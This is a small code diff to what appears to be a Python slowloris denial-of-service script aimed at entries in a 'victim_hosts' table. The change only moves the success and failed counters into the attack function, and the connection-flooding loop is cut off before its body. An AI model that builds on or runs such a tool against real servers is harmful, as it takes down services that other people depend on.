@@ -1,8 +1,6 @@
 import socket, random, sys, time
 
 sockets = []
-success = 0
-failed = 0
 log = False
 user_agents = [
     "Mozilla/5.0 (Macintosh; Intel Mac OS X 10_11_6) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/53.0.2785.143 Safari/537.36",
@@ -45,6 +43,8 @@ def create_socket(IP, port):
     return s
 
 def slowloris(victim_type, port, socket_count, log):
+    failed = 0
+    success = 0
     IP = victim_hosts[victim_type]
     try:
         while True:
